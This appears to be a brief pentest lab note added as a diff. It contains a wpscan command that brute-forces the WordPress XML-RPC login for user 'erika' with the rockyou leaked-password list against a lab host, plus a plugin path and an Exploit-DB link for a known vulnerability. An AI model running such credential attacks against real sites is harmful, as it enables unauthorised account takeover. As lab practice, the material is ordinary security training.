@@ -1,0 +1,6 @@
+wpscan --password-attack xmlrpc -t 20 -U erika -P /home/l4b/Downloads/thebuffet/wordlists/seclistsIMPROVED/Passwords/Leaked-Databases/rockyou.txt --url http://blog.inlanefreight.local/
+
+http://blog.inlanefreight.local/wp-content/plugins/site-editor/
+
+https://www.exploit-db.com/exploits/48698
+
